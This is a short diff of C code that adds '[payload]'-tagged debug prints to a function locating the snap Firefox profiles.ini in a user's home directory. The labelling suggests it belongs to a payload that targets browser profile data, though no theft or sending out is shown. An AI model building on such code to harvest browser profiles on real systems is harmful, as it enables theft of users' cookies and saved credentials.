@@ -1072,8 +1072,15 @@ static int find_firefox_profile(char *profile_path_out, size_t len) {
     snprintf(profiles_ini, sizeof(profiles_ini),
              "%s/snap/firefox/common/.mozilla/firefox/profiles.ini", home);
 
+    printf("[payload] Trying profiles.ini at: %s\n", profiles_ini);
+    fflush(stdout);
+
     FILE *fp = fopen(profiles_ini, "r");
-    if (!fp) return 0;
+    if (!fp) {
+        printf("[payload] fopen failed: %s\n", strerror(errno));
+        fflush(stdout);
+        return 0;
+    }
 
     char line[512];
     while (fgets(line, sizeof(line), fp)) {
